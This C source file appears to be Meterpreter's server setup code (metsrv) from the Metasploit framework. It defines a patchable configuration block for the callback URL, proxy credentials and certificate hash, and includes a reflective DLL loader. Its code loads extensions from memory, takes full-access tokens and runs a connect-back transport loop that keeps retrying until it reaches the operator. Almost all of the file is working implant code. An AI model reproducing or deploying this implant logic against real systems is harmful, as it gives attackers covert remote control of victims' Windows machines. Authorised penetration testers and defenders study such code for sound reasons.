/*!
 * @file server_setup.c
 */
#include "metsrv.h"
#include "../../common/common.h"
#include <ws2tcpip.h>

#include "win/server_transport_winhttp.h"
#include "win/server_transport_tcp.h"

#define TRANSPORT_ID_OFFSET 22

extern Command* extensionCommands;

typedef struct _MetsrvConfigData
{
	wchar_t transport[28];
	wchar_t url[524];
	wchar_t ua[256];
	wchar_t proxy[104];
	wchar_t proxy_username[112];
	wchar_t proxy_password[112];
	BYTE ssl_cert_hash[28];
	int expiration_timeout;
	int comm_timeout;
} MetsrvConfigData;

MetsrvConfigData global_config =
{
	.transport = L"METERPRETER_TRANSPORT_SSL\x00\x00",
	.url = L"https://XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX/\x00\x00",
	.ua = L"METERPRETER_UA\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00",
	.proxy = L"METERPRETER_PROXY\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00",
	.proxy_username = L"METERPRETER_USERNAME_PROXY\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00",
	.proxy_password = L"METERPRETER_PASSWORD_PROXY\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00",
	.ssl_cert_hash = "METERPRETER_SSL_CERT_HASH\x00\x00\x00",
	.expiration_timeout = 0xb64be661,
	.comm_timeout = 0xaf79257f
};

// include the Reflectiveloader() function
#include "../ReflectiveDLLInjection/dll/src/ReflectiveLoader.c"

int exceptionfilter(unsigned int code, struct _EXCEPTION_POINTERS *ep)
{
	return EXCEPTION_EXECUTE_HANDLER;
}

#define InitAppInstance() { if( hAppInstance == NULL ) hAppInstance = GetModuleHandle( NULL ); }

/*!
 * @brief Get the session id that this meterpreter server is running in.
 * @return ID of the current server session.
 */
DWORD server_sessionid()
{
	typedef BOOL (WINAPI * PROCESSIDTOSESSIONID)( DWORD pid, LPDWORD id );

	static PROCESSIDTOSESSIONID pProcessIdToSessionId = NULL;
	HMODULE hKernel   = NULL;
	DWORD dwSessionId = 0;

	do
	{
		if (!pProcessIdToSessionId)
		{
			hKernel = LoadLibraryA("kernel32.dll");
			if (hKernel)
			{
				pProcessIdToSessionId = (PROCESSIDTOSESSIONID)GetProcAddress(hKernel, "ProcessIdToSessionId");
			}
		}

		if (!pProcessIdToSessionId)
		{
			break;
		}

		if (!pProcessIdToSessionId(GetCurrentProcessId(), &dwSessionId))
		{
			dwSessionId = -1;
		}

	} while( 0 );

	if (hKernel)
	{
		FreeLibrary(hKernel);
	}

	return dwSessionId;
}

/*!
 * @brief Load any stageless extensions that might be present in the current payload.
 * @param pRemote Pointer to the remote instance.
 * @param fd The socket descriptor passed to metsrv during intialisation.
 */
VOID load_stageless_extensions(Remote* pRemote, ULONG_PTR fd)
{
	LPBYTE pExtensionStart = (LPBYTE)fd + sizeof(DWORD);
	DWORD size = *((LPDWORD)(pExtensionStart - sizeof(DWORD)));

	while (size > 0)
	{
		dprintf("[SERVER] Extension located at 0x%p: %u bytes", pExtensionStart, size);
		HMODULE hLibrary = LoadLibraryR(pExtensionStart, size);
		dprintf("[SERVER] Extension located at 0x%p: %u bytes loaded to %x", pExtensionStart, size, hLibrary);
		initialise_extension(hLibrary, TRUE, pRemote, NULL, extensionCommands);

		pExtensionStart += size + sizeof(DWORD);
		size = *((LPDWORD)(pExtensionStart - sizeof(DWORD)));
	}

	dprintf("[SERVER] All stageless extensions loaded");
}

/*!
 * @brief Create a new transport based on the given metsrv configuration.
 * @param config Pointer to the metsrv configuration block.
 * @param stageless Indication of whether the configuration is stageless.
 * @param fd The socket descriptor passed to metsrv during intialisation.
 */
static Transport* transport_create(MetsrvConfigData* config, BOOL stageless)
{
	Transport* t = NULL;
	wchar_t* transport = config->transport + TRANSPORT_ID_OFFSET;
	wchar_t* url = config->url + (stageless ? 1 : 0);

	dprintf("[TRANSPORT] Type = %S", config->transport);
	dprintf("[TRANSPORT] URL = %S", config->url);

	if (wcscmp(transport, L"SSL") == 0)
	{
		t = transport_create_tcp(config->url);
	}
	else
	{
		BOOL ssl = wcscmp(transport, L"HTTPS") == 0;
		t = transport_create_http(ssl, url, config->ua, config->proxy, config->proxy_username,
			config->proxy_password, config->ssl_cert_hash, config->expiration_timeout, config->comm_timeout);
	}

	return t;
}

/*!
 * @brief Setup and run the server. This is called from Init via the loader.
 * @param fd The original socket descriptor passed in from the stager, or a pointer to stageless extensions.
 * @return Meterpreter exit code (ignored by the caller).
 */
DWORD server_setup(SOCKET fd)
{
	THREAD* serverThread = NULL;
	Remote* pRemote = NULL;
	char cStationName[256] = { 0 };
	char cDesktopName[256] = { 0 };
	DWORD res = 0;

	// first byte of the URL indites 's' if it's stageless
	BOOL bStageless = global_config.url[0] == 's';

	dprintf("[SERVER] Initializing...");

	// if hAppInstance is still == NULL it means that we havent been
	// reflectivly loaded so we must patch in the hAppInstance value
	// for use with loading server extensions later.
	InitAppInstance();

	srand((unsigned int)time(NULL));

	__try
	{
		do
		{
			dprintf("[SERVER] module loaded at 0x%08X", hAppInstance);

			// Open a THREAD item for the servers main thread, we use this to manage migration later.
			serverThread = thread_open();

			dprintf("[SERVER] main server thread: handle=0x%08X id=0x%08X sigterm=0x%08X", serverThread->handle, serverThread->id, serverThread->sigterm);

			if (!(pRemote = remote_allocate()))
			{
				SetLastError(ERROR_NOT_ENOUGH_MEMORY);
				break;
			}

			// Store our thread handle
			pRemote->hServerThread = serverThread->handle;

			// Store our process token
			if (!OpenThreadToken(pRemote->hServerThread, TOKEN_ALL_ACCESS, TRUE, &pRemote->hServerToken))
			{
				OpenProcessToken(GetCurrentProcess(), TOKEN_ALL_ACCESS, &pRemote->hServerToken);
			}

			// Copy it to the thread token
			pRemote->hThreadToken = pRemote->hServerToken;

			// Save the initial session/station/desktop names...
			pRemote->dwOrigSessionId = server_sessionid();
			pRemote->dwCurrentSessionId = pRemote->dwOrigSessionId;
			GetUserObjectInformation(GetProcessWindowStation(), UOI_NAME, &cStationName, 256, NULL);
			pRemote->cpOrigStationName = _strdup(cStationName);
			pRemote->cpCurrentStationName = _strdup(cStationName);
			GetUserObjectInformation(GetThreadDesktop(GetCurrentThreadId()), UOI_NAME, &cDesktopName, 256, NULL);
			pRemote->cpOrigDesktopName = _strdup(cDesktopName);
			pRemote->cpCurrentDesktopName = _strdup(cDesktopName);

			dprintf("[SERVER] Registering dispatch routines...");
			register_dispatch_routines();

			if (bStageless)
			{
				// in the case of stageless payloads, fd contains a pointer to the extensions
				// to load
				dprintf("[SERVER] Loading stageless extensions");
				load_stageless_extensions(pRemote, (ULONG_PTR)fd);
			}

			// allocate the "next transport" information
			dprintf("[SERVER] creating transport");
			pRemote->nextTransport = transport_create(&global_config, bStageless);

			while (pRemote->nextTransport)
			{
				// Work off the next transport
				pRemote->transport = pRemote->nextTransport;

				dprintf("[SERVER] initialising transport 0x%p", pRemote->transport->transport_init);
				if (pRemote->transport->transport_init && !pRemote->transport->transport_init(pRemote, fd))
				{
					// Hackety hack hack!
					Sleep(5000);
					break;
				}

				// once initialised, we'll clean up the next transport so that we don't try again
				pRemote->nextTransport = NULL;

				dprintf("[SERVER] Entering the main server dispatch loop for transport %x, context %x", pRemote->transport, pRemote->transport->ctx);
				DWORD dispatchResult = pRemote->transport->server_dispatch(pRemote, serverThread);

				if (pRemote->transport->transport_deinit)
				{
					pRemote->transport->transport_deinit(pRemote);
				}

				// If the transport mechanism failed, then we should loop until we're able to connect back again.
				// But if it was successful, and this is a valid exit, then we should clean up and leave.
				if (dispatchResult == ERROR_SUCCESS)
				{
					pRemote->transport->transport_destroy(pRemote);
				}
				else
				{
					// try again!
					if (pRemote->transport->transport_reset)
					{
						pRemote->transport->transport_reset(pRemote->transport);
					}
					pRemote->nextTransport = pRemote->transport;
				}
			}

			dprintf("[SERVER] Deregistering dispatch routines...");
			deregister_dispatch_routines(pRemote);
		} while (0);

		remote_deallocate(pRemote);
	}
	__except (exceptionfilter(GetExceptionCode(), GetExceptionInformation()))
	{
		dprintf("[SERVER] *** exception triggered!");

		thread_kill(serverThread);
	}

	dprintf("[SERVER] Finished.");
	return res;
}
